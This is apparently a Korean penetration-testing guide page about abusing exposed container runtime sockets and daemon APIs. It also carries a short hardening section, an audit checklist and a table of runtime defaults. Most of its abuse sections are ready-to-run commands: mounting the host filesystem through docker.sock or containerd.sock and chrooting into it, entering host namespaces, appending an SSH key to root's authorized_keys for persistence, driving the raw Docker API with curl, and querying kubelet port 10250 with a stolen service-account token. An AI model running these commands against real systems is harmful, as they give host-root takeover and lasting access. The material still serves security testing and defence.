# Runtime API And Daemon Exposure

## 개요

실제 container compromise의 상당수는 namespace escape에서 시작하지 않습니다. 대신 runtime control plane에 대한 접근에서 시작합니다. workload가 마운트된 Unix socket 또는 노출된 TCP listener를 통해 `dockerd`, `containerd`, CRI-O, Podman 또는 kubelet과 통신할 수 있다면, attacker는 더 높은 privilege를 가진 새 container를 요청하거나, host filesystem을 마운트하거나, host namespace에 join하거나, 민감한 node 정보를 가져올 수 있습니다. 이러한 경우 runtime API가 실제 security boundary이며, 이를 compromise하는 것은 사실상 host를 compromise하는 것과 가깝습니다.

이 때문에 runtime socket exposure는 kernel protections와 별도로 문서화해야 합니다. 일반적인 seccomp, capabilities 및 MAC confinement가 적용된 container라도 `/var/run/docker.sock` 또는 `/run/containerd/containerd.sock`이 내부에 마운트되어 있다면 host compromise까지 단 한 번의 API call만 남을 수 있습니다. 현재 container의 kernel isolation은 정확히 설계된 대로 작동하고 있을 수 있지만, runtime management plane은 완전히 노출된 상태로 남아 있을 수 있습니다.

## Daemon Access Models

Docker Engine은 전통적으로 로컬 Unix socket인 `unix:///var/run/docker.sock`을 통해 privileged API를 노출합니다. 과거에는 `tcp://0.0.0.0:2375`와 같은 TCP listener 또는 TLS로 보호되는 `2376` listener를 통해 원격으로 노출되기도 했습니다. 강력한 TLS와 client authentication 없이 daemon을 원격으로 노출하면 Docker API가 사실상 원격 root interface로 바뀝니다.

containerd, CRI-O, Podman 및 kubelet도 유사한 high-impact surface를 노출합니다. 이름과 workflow는 다르지만 논리는 동일합니다. 해당 interface를 통해 caller가 workload를 생성하거나, host path를 마운트하거나, credential을 가져오거나, 실행 중인 container를 변경할 수 있다면, 그 interface는 privileged management channel이며 이에 맞게 취급해야 합니다.

확인할 가치가 있는 일반적인 로컬 경로는 다음과 같습니다.
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
더 오래되었거나 더 특수한 stack에서는 `dockershim.sock`, `frakti.sock` 또는 `rktlet.sock`과 같은 endpoint도 노출될 수 있습니다. 이러한 endpoint는 최신 환경에서는 덜 일반적이지만, 발견되는 경우 일반적인 application socket이 아니라 runtime-control surface를 나타내므로 동일한 주의가 필요합니다.

## Secure Remote Access

daemon을 local socket의 범위를 넘어 노출해야 한다면 connection은 TLS로 보호해야 하며, 가능하면 mutual authentication을 사용하여 daemon이 client를 검증하고 client도 daemon을 검증하도록 해야 합니다. 편의를 위해 Docker daemon을 일반 HTTP에서 여는 오래된 관행은 container administration에서 가장 위험한 실수 중 하나입니다. API surface가 privileged container를 직접 생성할 수 있을 만큼 강력하기 때문입니다.

역사적으로 Docker configuration pattern은 다음과 같았습니다.
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
systemd 기반 호스트에서는 데몬 통신이 `fd://`로 나타날 수도 있습니다. 이는 프로세스가 직접 소켓을 바인딩하는 대신 systemd에서 미리 연 소켓을 상속한다는 의미입니다. 중요한 점은 정확한 구문이 아니라 보안상 결과입니다. 데몬이 엄격하게 권한이 제한된 로컬 소켓을 넘어선 곳에서 수신하는 순간, transport security와 client authentication은 선택적인 hardening이 아니라 필수가 됩니다.

## Abuse

runtime socket이 존재한다면 어떤 소켓인지, 호환되는 client가 있는지, raw HTTP 또는 gRPC access가 가능한지 확인합니다:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```
이러한 명령은 연결할 수 없는 경로, 마운트되었지만 접근할 수 없는 socket, 그리고 활성화된 privileged API를 구분하는 데 유용합니다. client가 성공하면, 다음으로 확인할 사항은 해당 API를 통해 host bind mount 또는 host namespace sharing을 사용하여 새 container를 실행할 수 있는지 여부입니다.

### Client가 설치되어 있지 않은 경우

`docker`, `podman` 또는 다른 friendly CLI가 없다고 해서 socket이 안전하다는 의미는 아닙니다. Docker Engine은 Unix socket을 통해 HTTP를 사용하며, Podman은 `podman system service`를 통해 Docker-compatible API와 Libpod-native API를 모두 노출합니다. 따라서 `curl`만 있는 minimal environment에서도 daemon을 제어하기에 충분할 수 있습니다:
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
-X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```
이는 post-exploitation 중에 중요합니다. 방어자가 때때로 일반적인 client binaries는 제거하면서 management socket은 mount된 상태로 남겨 두기 때문입니다. Podman hosts에서는 rootful 및 rootless deployment 간에 high-value path가 다르다는 점을 기억해야 합니다. rootful service instances의 경우 `unix:///run/podman/podman.sock`, rootless의 경우 `unix://$XDG_RUNTIME_DIR/podman/podman.sock`입니다.

### 전체 예시: Docker Socket에서 Host Root로

`docker.sock`에 접근할 수 있다면, 고전적인 escape 방법은 host root filesystem을 mount한 새 container를 시작한 다음 그 안에서 `chroot`하는 것입니다:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
이는 Docker daemon을 통한 직접적인 host-root 실행을 제공합니다. 영향은 file read에만 국한되지 않습니다. 새로운 container 내부에 들어간 후 공격자는 host 파일을 변경하고, credentials를 수집하며, persistence를 심거나, 추가 privileged workload를 시작할 수 있습니다.

### Full Example: Docker Socket To Host Namespaces

공격자가 filesystem-only access 대신 namespace entry를 선호하는 경우:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
이 경로는 현재 컨테이너를 exploit하는 대신, runtime에 명시적인 host-namespace 노출을 적용한 새 컨테이너를 생성하도록 요청하여 host에 도달합니다.

### Docker Socket Persistence Pattern

Runtime control은 일회성 shell 대신 persistence에도 사용할 수 있습니다. 일반적인 패턴은 host mount가 포함된 helper container를 생성하고, mount된 host filesystem에 authorized access material 또는 startup hook을 작성한 다음, host가 이를 consume하는지 검증하는 것입니다.

예시 형태:
```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```
동일한 아이디어를 systemd units, cron fragments, application startup files 또는 SSH keys에 적용할 수 있으며, 이는 operator가 입증하려는 내용에 따라 달라집니다. 중요한 점은 persistent change가 원래 container의 추가 privilege를 통해서가 아니라 runtime daemon이 보유한 host-level filesystem authority를 통해 이루어진다는 것입니다.

### Raw Docker API Helper Pivot

Docker CLI가 없는 경우에도 Unix socket을 통한 HTTP로 동일한 host-mount helper flow를 수행할 수 있습니다. 일반적인 flow는 API를 확인하고, host bind mount가 포함된 helper container를 생성한 다음, 이를 시작하고, exec instance를 생성한 뒤 해당 exec를 시작하는 것입니다.
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
-X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
-X POST http://localhost/v1.54/containers/helper/exec
```
최종 `/exec/<id>/start` 요청은 반환된 exec ID에 의존하지만, 보안상의 핵심은 정확한 JSON 처리 방식과 무관합니다. rootful Docker daemon에 대한 raw API access만으로도 더 강력한 helper workload를 요청하기에 충분합니다.

### 전체 예시: containerd Socket

마운트된 `containerd` Socket은 일반적으로 그만큼 위험합니다:<sup>[[1]](#references)</sup>
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
더 Docker와 유사한 client가 있다면 `--privileged`, `--pid=host`, `-v`와 같은 익숙한 flag를 제공하므로 `nerdctl`이 `ctr`보다 더 편리할 수 있습니다:
```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
--privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```
영향은 다시 호스트 compromise입니다. Docker 전용 tooling이 없더라도 다른 runtime API가 동일한 관리 권한을 제공할 수 있습니다. Kubernetes 노드에서는 `crictl`이 CRI endpoint와 직접 통신하므로 reconnaissance와 container interaction에 충분할 수 있습니다.

### BuildKit Socket

사람들은 `buildkitd`를 흔히 "단순한 build backend"라고 생각하기 때문에 이를 놓치기 쉽지만, daemon은 여전히 권한 있는 control plane입니다. 접근 가능한 `buildkitd.sock`을 통해 attacker는 arbitrary build steps를 실행하고, worker capabilities를 확인하며, compromise된 환경의 local contexts를 사용하고, daemon이 허용하도록 구성된 경우 `network.host` 또는 `security.insecure`와 같은 위험한 entitlements를 요청할 수 있습니다.

유용한 첫 interaction은 다음과 같습니다:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```
daemon이 build requests를 수락한다면, insecure entitlements를 사용할 수 있는지 테스트합니다:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
--frontend dockerfile.v0 \
--local context=. \
--local dockerfile=. \
--allow network.host \
--allow security.insecure \
--output type=local,dest=/tmp/buildkit-out
```
정확한 영향은 daemon 설정에 따라 달라지지만, permissive entitlements가 적용된 rootful BuildKit 서비스는 단순히 개발자를 위한 편의 기능으로 볼 수 없습니다. 특히 CI runners와 shared build nodes에서는 또 하나의 고가치 관리 surface로 간주해야 합니다.

### TCP를 통한 Kubelet API

kubelet은 container runtime은 아니지만, 여전히 node management plane의 일부이며 동일한 trust boundary 논의에 포함되는 경우가 많습니다. kubelet secure port `10250`이 workload에서 접근 가능하거나 node credentials, kubeconfigs 또는 proxy rights가 노출된 경우, attacker는 Kubernetes API server admission path를 전혀 거치지 않고도 Pods를 열거하거나 logs를 가져오거나 node-local containers에서 commands를 실행할 수 있습니다.

먼저 비용이 적은 discovery부터 시작합니다:
```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```
kubelet 또는 API-server proxy 경로가 `exec`를 승인하면, WebSocket-capable client가 이를 이용해 노드의 다른 container에서 code execution을 수행할 수 있습니다. 이것이 `get` 권한만 있는 `nodes/proxy`도 생각보다 더 위험한 이유이기도 합니다. 요청이 여전히 command를 실행하는 kubelet endpoint에 도달할 수 있으며, 이러한 직접적인 kubelet 상호작용은 일반적인 Kubernetes audit log에 나타나지 않습니다.<sup>[[2]](#references)</sup>

## 점검

이 점검의 목적은 container가 trust boundary 외부에 남아 있어야 하는 management plane에 접근할 수 있는지 확인하는 것입니다.
```bash
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```
여기서 흥미로운 점:

- Mounted runtime socket은 단순한 정보 disclosure가 아니라, 일반적으로 직접적인 administrative primitive입니다.
- TLS가 적용되지 않은 `2375`의 TCP listener는 remote-compromise 조건으로 간주해야 합니다.
- `DOCKER_HOST`와 같은 environment variable은 workload가 host runtime과 통신하도록 의도적으로 설계되었음을 드러내는 경우가 많습니다.

## Runtime Defaults

| Runtime / platform | 기본 상태 | 기본 동작 | 일반적인 수동 약화 |
| --- | --- | --- | --- |
| Docker Engine | 기본적으로 Local Unix socket | `dockerd`는 local socket에서 listen하며 daemon은 일반적으로 rootful로 실행됨 | `/var/run/docker.sock` mounting, `tcp://...:2375` exposing, `2376`에서 TLS가 약하거나 없음 |
| Podman | 기본적으로 Daemonless CLI | 일반적인 local 사용에는 장기간 실행되는 privileged daemon이 필요하지 않음. `podman system service`가 활성화되면 API socket이 여전히 exposed될 수 있음 | `podman.sock` exposing, service를 광범위하게 실행, rootful API 사용 |
| containerd | Local privileged socket | Administrative API는 local socket을 통해 exposed되며 일반적으로 higher-level tooling이 사용함 | `containerd.sock` mounting, 광범위한 `ctr` 또는 `nerdctl` access, privileged namespace exposing |
| CRI-O | Local privileged socket | CRI endpoint는 node-local trusted component를 대상으로 함 | `crio.sock` mounting, CRI endpoint를 untrusted workload에 exposing |
| Kubernetes kubelet | Node-local management API | Kubelet은 Pod에서 광범위하게 접근 가능하면 안 됨. 인증 및 권한 부여 설정에 따라 access를 통해 pod state, credential 및 execution feature가 노출될 수 있음 | kubelet socket 또는 cert mounting, weak kubelet auth, host networking과 reachable kubelet endpoint의 조합 |

## References

- [1] [containerd socket exploitation 1부](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [2] [Kubernetes API Server 우회 위험](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
